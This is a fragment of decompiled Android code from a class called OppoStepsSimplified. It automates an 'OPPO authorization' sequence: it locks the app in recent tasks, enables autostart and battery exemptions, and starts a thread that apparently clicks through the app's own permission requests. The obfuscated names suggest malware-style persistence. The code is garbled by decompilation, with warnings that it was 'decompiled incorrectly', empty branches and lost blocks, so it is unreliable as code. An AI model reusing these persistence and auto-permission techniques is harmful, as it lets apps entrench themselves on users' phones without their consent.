                t60.m214704c5("OppoSteps", "│ 执行OPPO专用锁定流程...");
                oppoStepsSimplified$execute$1.f54542a0 = c0368a521;
                oppoStepsSimplified$execute$1.f54543a1 = j23;
                oppoStepsSimplified$execute$1.f54547a5 = 27;
                objM212328c6 = c0368a521.m212328c6(oppoStepsSimplified$execute$1);
                j26 = j23;
                c0368a524 = c0368a521;
                if (objM212328c6 == coroutineSingletons) {
                }
                if (((Boolean) objM212328c6).booleanValue()) {
                }
                t60.m214704c5("OppoSteps", "└─── 最近任务锁定 完成 ───────────────────");
                oppoStepsSimplified$execute$1.f54542a0 = c0368a523;
                oppoStepsSimplified$execute$1.f54543a1 = j25;
                oppoStepsSimplified$execute$1.f54547a5 = 28;
                objM212347f2 = c0368a523.m212347f2(oppoStepsSimplified$execute$1);
                r4 = j25;
                r8 = c0368a523;
                if (objM212347f2 == coroutineSingletons) {
                }
                long jCurrentTimeMillis322 = System.currentTimeMillis() - r4;
                t60.m214704c5("OppoSteps", str5);
                t60.m214704c5("OppoSteps", "║  OPPO授权流程完成");
                r9 = obj3;
                String str2422 = String.format(r9, Arrays.copyOf(new Object[]{new Double(jCurrentTimeMillis322 / 1000.0d)}, 1));
                StringBuilder sb322 = new StringBuilder();
                sb322.append("║  总耗时: ");
                sb322.append(jCurrentTimeMillis322);
                str2 = "ms (";
                sb322.append(str2);
                sb322.append(str2422);
                str = "秒)";
                sb322.append(str);
                t60.m214704c5("OppoSteps", sb322.toString());
                t60.m214704c5("OppoSteps", str9);
                return t60.m214689a7(true);
            case 27:
                long j53 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a537 = oppoStepsSimplified$execute$1.f54542a0;
                try {
                    kg1.m213544f4(obj3);
                    str9 = "╚═══════════════════════════════════════════════════════════╝";
                    str5 = "╔═══════════════════════════════════════════════════════════╗";
                    objM212328c6 = obj3;
                    obj3 = "%.2f";
                    j26 = j53;
                    c0368a524 = c0368a537;
                    if (((Boolean) objM212328c6).booleanValue()) {
                    }
                } catch (Exception e30) {
                    e = e30;
                    obj3 = "%.2f";
                    str9 = "╚═══════════════════════════════════════════════════════════╝";
                    str5 = "╔═══════════════════════════════════════════════════════════╗";
                    j24 = j53;
                    c0368a522 = c0368a537;
                    t60.m214705c6("OppoSteps", "│ 应用锁定失败: " + e.getMessage(), e);
                    j25 = j24;
                    c0368a523 = c0368a522;
                    t60.m214704c5("OppoSteps", "└─── 最近任务锁定 完成 ───────────────────");
                    oppoStepsSimplified$execute$1.f54542a0 = c0368a523;
                    oppoStepsSimplified$execute$1.f54543a1 = j25;
                    oppoStepsSimplified$execute$1.f54547a5 = 28;
                    objM212347f2 = c0368a523.m212347f2(oppoStepsSimplified$execute$1);
                    r4 = j25;
                    r8 = c0368a523;
                    if (objM212347f2 == coroutineSingletons) {
                    }
                    long jCurrentTimeMillis3222 = System.currentTimeMillis() - r4;
                    t60.m214704c5("OppoSteps", str5);
                    t60.m214704c5("OppoSteps", "║  OPPO授权流程完成");
                    r9 = obj3;
                    String str24222 = String.format(r9, Arrays.copyOf(new Object[]{new Double(jCurrentTimeMillis3222 / 1000.0d)}, 1));
                    StringBuilder sb3222 = new StringBuilder();
                    sb3222.append("║  总耗时: ");
                    sb3222.append(jCurrentTimeMillis3222);
                    str2 = "ms (";
                    sb3222.append(str2);
                    sb3222.append(str24222);
                    str = "秒)";
                    sb3222.append(str);
                    t60.m214704c5("OppoSteps", sb3222.toString());
                    t60.m214704c5("OppoSteps", str9);
                    return t60.m214689a7(true);
                }
                t60.m214704c5("OppoSteps", "└─── 最近任务锁定 完成 ───────────────────");
                oppoStepsSimplified$execute$1.f54542a0 = c0368a523;
                oppoStepsSimplified$execute$1.f54543a1 = j25;
                oppoStepsSimplified$execute$1.f54547a5 = 28;
                objM212347f2 = c0368a523.m212347f2(oppoStepsSimplified$execute$1);
                r4 = j25;
                r8 = c0368a523;
                if (objM212347f2 == coroutineSingletons) {
                }
                long jCurrentTimeMillis32222 = System.currentTimeMillis() - r4;
                t60.m214704c5("OppoSteps", str5);
                t60.m214704c5("OppoSteps", "║  OPPO授权流程完成");
                r9 = obj3;
                String str242222 = String.format(r9, Arrays.copyOf(new Object[]{new Double(jCurrentTimeMillis32222 / 1000.0d)}, 1));
                StringBuilder sb32222 = new StringBuilder();
                sb32222.append("║  总耗时: ");
                sb32222.append(jCurrentTimeMillis32222);
                str2 = "ms (";
                sb32222.append(str2);
                sb32222.append(str242222);
                str = "秒)";
                sb32222.append(str);
                t60.m214704c5("OppoSteps", sb32222.toString());
                t60.m214704c5("OppoSteps", str9);
                return t60.m214689a7(true);
            case 28:
                long j54 = oppoStepsSimplified$execute$1.f54543a1;
                C0368a5 c0368a538 = oppoStepsSimplified$execute$1.f54542a0;
                kg1.m213544f4(obj3);
                obj3 = "%.2f";
                str9 = "╚═══════════════════════════════════════════════════════════╝";
                str5 = "╔═══════════════════════════════════════════════════════════╗";
                r4 = j54;
                r8 = c0368a538;
                long jCurrentTimeMillis322222 = System.currentTimeMillis() - r4;
                t60.m214704c5("OppoSteps", str5);
                t60.m214704c5("OppoSteps", "║  OPPO授权流程完成");
                r9 = obj3;
                String str2422222 = String.format(r9, Arrays.copyOf(new Object[]{new Double(jCurrentTimeMillis322222 / 1000.0d)}, 1));
                StringBuilder sb322222 = new StringBuilder();
                sb322222.append("║  总耗时: ");
                sb322222.append(jCurrentTimeMillis322222);
                str2 = "ms (";
                sb322222.append(str2);
                sb322222.append(str2422222);
                str = "秒)";
                sb322222.append(str);
                t60.m214704c5("OppoSteps", sb322222.toString());
                t60.m214704c5("OppoSteps", str9);
                return t60.m214689a7(true);
            case 29:
                kg1.m213544f4(obj3);
                return t60.m214689a7(false);
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212322c0(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1 oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1;
        C0368a5 c0368a5;
        boolean zM212336d9;
        if (continuationImpl instanceof OppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1) {
            oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1 = (OppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1) continuationImpl;
            int i = oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1.f54551a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1.f54551a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1 = new OppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1.f54549a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1.f54551a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1.f54548a0 = this;
                oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1.f54551a3 = 1;
                if (m212318b6(oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0368a5 = this;
            } catch (Exception e) {
                e = e;
                c0368a5 = this;
                String str = "❌ 自启动设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str);
                zM212336d9 = false;
                return Boolean.valueOf(zM212336d9);
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$executeBackgroundAndAutoStartWithResult$1.f54548a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
                String str2 = "❌ 自启动设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str2);
                zM212336d9 = false;
                return Boolean.valueOf(zM212336d9);
            }
        }
        zM212336d9 = c0368a5.m212336d9("autostart");
        return Boolean.valueOf(zM212336d9);
    }

    /* JADX WARN: Code restructure failed: missing block: B:26:0x00b2, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L27;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:26:0x00b2 -> B:28:0x00b5). Please report as a decompilation issue!!! */
    /* renamed from: c1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212323c1(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeBasicPermissions$1 oppoStepsSimplified$executeBasicPermissions$1;
        C0368a5 c0368a5;
        C0368a5 c0368a52;
        int i;
        umrkmgrri.C0373a0 c0373a0;
        if (continuationImpl instanceof OppoStepsSimplified$executeBasicPermissions$1) {
            oppoStepsSimplified$executeBasicPermissions$1 = (OppoStepsSimplified$executeBasicPermissions$1) continuationImpl;
            int i2 = oppoStepsSimplified$executeBasicPermissions$1.f54556a4;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeBasicPermissions$1.f54556a4 = i2 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeBasicPermissions$1 = new OppoStepsSimplified$executeBasicPermissions$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeBasicPermissions$1.f54554a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = oppoStepsSimplified$executeBasicPermissions$1.f54556a4;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            m212303e0("★★★ 开始基础权限流程 ★★★");
            m212303e0("步骤1: 启动umrkmgrri");
            umrkmgrri.f55158a3.start(this.f55112a1);
            m212303e0("步骤2: 延迟500ms...");
            oppoStepsSimplified$executeBasicPermissions$1.f54552a0 = this;
            oppoStepsSimplified$executeBasicPermissions$1.f54556a4 = 1;
            if (b81.m210571b1(500L, oppoStepsSimplified$executeBasicPermissions$1) != coroutineSingletons) {
                c0368a5 = this;
            }
            return coroutineSingletons;
        }
        if (i3 == 1) {
            c0368a5 = oppoStepsSimplified$executeBasicPermissions$1.f54552a0;
            kg1.m213544f4(obj);
        } else {
            if (i3 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i = oppoStepsSimplified$executeBasicPermissions$1.f54553a1;
            c0368a52 = oppoStepsSimplified$executeBasicPermissions$1.f54552a0;
            kg1.m213544f4(obj);
            i++;
            c0373a0 = umrkmgrri.f55158a3;
            if (c0373a0.isRequestingPermissions() || i >= 20) {
                c0373a0.setRequestingPermissions(false);
                c0368a52.getClass();
                m212303e0("★★★ 基础权限完成 ★★★");
                return C1351vv.f60710b1;
            }
            oppoStepsSimplified$executeBasicPermissions$1.f54552a0 = c0368a52;
            oppoStepsSimplified$executeBasicPermissions$1.f54553a1 = i;
            oppoStepsSimplified$executeBasicPermissions$1.f54556a4 = 2;
        }
        c0368a5.getClass();
        m212303e0("步骤3: 启动新线程执行点击逻辑");
        m212303e0("当前 isRequestingPermissions = " + umrkmgrri.f55158a3.isRequestingPermissions());
        c0368a5.f55131c0 = 0;
        Thread thread = new Thread(new RunnableC0941o6(15, c0368a5));
        m212303e0("启动点击线程...");
        thread.start();
        c0368a52 = c0368a5;
        i = 0;
        c0373a0 = umrkmgrri.f55158a3;
        if (c0373a0.isRequestingPermissions()) {
        }
        c0373a0.setRequestingPermissions(false);
        c0368a52.getClass();
        m212303e0("★★★ 基础权限完成 ★★★");
        return C1351vv.f60710b1;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212324c2(ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$executeBatterySettingsWithResult$1 oppoStepsSimplified$executeBatterySettingsWithResult$1;
        C0368a5 c0368a5;
        boolean zM212336d9;
        if (continuationImpl instanceof OppoStepsSimplified$executeBatterySettingsWithResult$1) {
            oppoStepsSimplified$executeBatterySettingsWithResult$1 = (OppoStepsSimplified$executeBatterySettingsWithResult$1) continuationImpl;
            int i = oppoStepsSimplified$executeBatterySettingsWithResult$1.f54560a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$executeBatterySettingsWithResult$1.f54560a3 = i - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$executeBatterySettingsWithResult$1 = new OppoStepsSimplified$executeBatterySettingsWithResult$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$executeBatterySettingsWithResult$1.f54558a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = oppoStepsSimplified$executeBatterySettingsWithResult$1.f54560a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            try {
                oppoStepsSimplified$executeBatterySettingsWithResult$1.f54557a0 = this;
                oppoStepsSimplified$executeBatterySettingsWithResult$1.f54560a3 = 1;
                if (m212337e1(oppoStepsSimplified$executeBatterySettingsWithResult$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0368a5 = this;
            } catch (Exception e) {
                e = e;
                c0368a5 = this;
                String str = "❌ 电池设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str);
                zM212336d9 = false;
                return Boolean.valueOf(zM212336d9);
            }
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0368a5 = oppoStepsSimplified$executeBatterySettingsWithResult$1.f54557a0;
            try {
                kg1.m213544f4(obj);
            } catch (Exception e2) {
                e = e2;
                String str2 = "❌ 电池设置异常: " + e.getMessage();
                c0368a5.getClass();
                m212303e0(str2);
                zM212336d9 = false;
                return Boolean.valueOf(zM212336d9);
            }
        }
        zM212336d9 = c0368a5.m212336d9("battery");
        return Boolean.valueOf(zM212336d9);
    }

    /* JADX WARN: Can't wrap try/catch for region: R(2:102|199) */
    /* JADX WARN: Code restructure failed: missing block: B:113:0x022d, code lost:
    
        r9 = r1;
     */
    /* JADX WARN: Code restructure failed: missing block: B:114:0x0230, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:119:0x0238, code lost:
    
        if (r0 != false) goto L120;
     */
    /* JADX WARN: Code restructure failed: missing block: B:189:0x03b3, code lost:
    
        if (p000.b81.m210571b1(r0, r6) == r7) goto L190;
     */
    /* JADX WARN: Code restructure failed: missing block: B:93:0x01a3, code lost:
    
        if (r0 != false) goto L94;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Path cross not found for [B:118:0x0236, B:120:0x023a], limit reached: 198 */
    /* JADX WARN: Path cross not found for [B:120:0x023a, B:118:0x0236], limit reached: 198 */
    /* JADX WARN: Path cross not found for [B:120:0x023a, B:138:0x028d], limit reached: 198 */
    /* JADX WARN: Path cross not found for [B:140:0x0291, B:152:0x02cc], limit reached: 198 */
    /* JADX WARN: Path cross not found for [B:152:0x02cc, B:140:0x0291], limit reached: 198 */
    /* JADX WARN: Removed duplicated region for block: B:104:0x01e7 A[Catch: Exception -> 0x0230, TryCatch #0 {Exception -> 0x0230, blocks: (B:102:0x01e1, B:104:0x01e7, B:106:0x01f3, B:109:0x021f, B:111:0x0225), top: B:199:0x01e1 }] */
    /* JADX WARN: Removed duplicated region for block: B:111:0x0225 A[Catch: Exception -> 0x0230, TRY_LEAVE, TryCatch #0 {Exception -> 0x0230, blocks: (B:102:0x01e1, B:104:0x01e7, B:106:0x01f3, B:109:0x021f, B:111:0x0225), top: B:199:0x01e1 }] */
    /* JADX WARN: Removed duplicated region for block: B:118:0x0236 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:122:0x0245 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:134:0x027d  */
    /* JADX WARN: Removed duplicated region for block: B:137:0x0285 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:138:0x028d A[Catch: Exception -> 0x0052, PHI: r8 r9
      0x028d: PHI (r8v13 int) = (r8v4 int), (r8v14 int), (r8v14 int) binds: [B:136:0x0283, B:131:0x0269, B:119:0x0238] A[DONT_GENERATE, DONT_INLINE]
      0x028d: PHI (r9v15 com.storm.safe.rock.service.modules.yw5xud.a5) = 
      (r9v51 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r9v52 com.storm.safe.rock.service.modules.yw5xud.a5)
      (r9v53 com.storm.safe.rock.service.modules.yw5xud.a5)
     binds: [B:136:0x0283, B:131:0x0269, B:119:0x0238] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:140:0x0291 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:151:0x02c4 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:154:0x02d0 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:159:0x0300  */
    /* JADX WARN: Removed duplicated region for block: B:162:0x0308 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:163:0x0310 A[Catch: Exception -> 0x0052, PHI: r8 r9
      0x0310: PHI (r8v8 int) = (r8v9 int), (r8v11 int) binds: [B:161:0x0306, B:153:0x02ce] A[DONT_GENERATE, DONT_INLINE]
      0x0310: PHI (r9v10 com.storm.safe.rock.service.modules.yw5xud.a5) = (r9v63 com.storm.safe.rock.service.modules.yw5xud.a5), (r9v64 com.storm.safe.rock.service.modules.yw5xud.a5) binds: [B:161:0x0306, B:153:0x02ce] A[DONT_GENERATE, DONT_INLINE], TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
    /* JADX WARN: Removed duplicated region for block: B:165:0x0314 A[Catch: Exception -> 0x0052, TryCatch #2 {Exception -> 0x0052, blocks: (B:64:0x00ef, B:67:0x0138, B:70:0x014e, B:72:0x0154, B:74:0x015a, B:76:0x0160, B:78:0x0166, B:80:0x016c, B:90:0x0199, B:92:0x019f, B:100:0x01c9, B:116:0x0232, B:118:0x0236, B:138:0x028d, B:140:0x0291, B:142:0x029c, B:144:0x02a4, B:146:0x02aa, B:149:0x02be, B:151:0x02c4, B:152:0x02cc, B:154:0x02d0, B:157:0x02ed, B:160:0x0302, B:162:0x0308, B:163:0x0310, B:165:0x0314, B:167:0x031f, B:169:0x0327, B:171:0x032d, B:174:0x0342, B:176:0x0348, B:177:0x0350, B:179:0x0356, B:180:0x035d, B:120:0x023a, B:122:0x0245, B:124:0x024d, B:126:0x0253, B:128:0x025b, B:130:0x0263, B:132:0x026b, B:135:0x027f, B:137:0x0285, B:94:0x01a5, B:97:0x01bb, B:99:0x01c1, B:84:0x0175, B:87:0x018b, B:89:0x0191, B:14:0x004d, B:19:0x0059, B:22:0x0062, B:25:0x006b, B:28:0x0074, B:31:0x007d, B:39:0x0096, B:42:0x00a0, B:45:0x00aa, B:48:0x00b3), top: B:203:0x0033 }] */
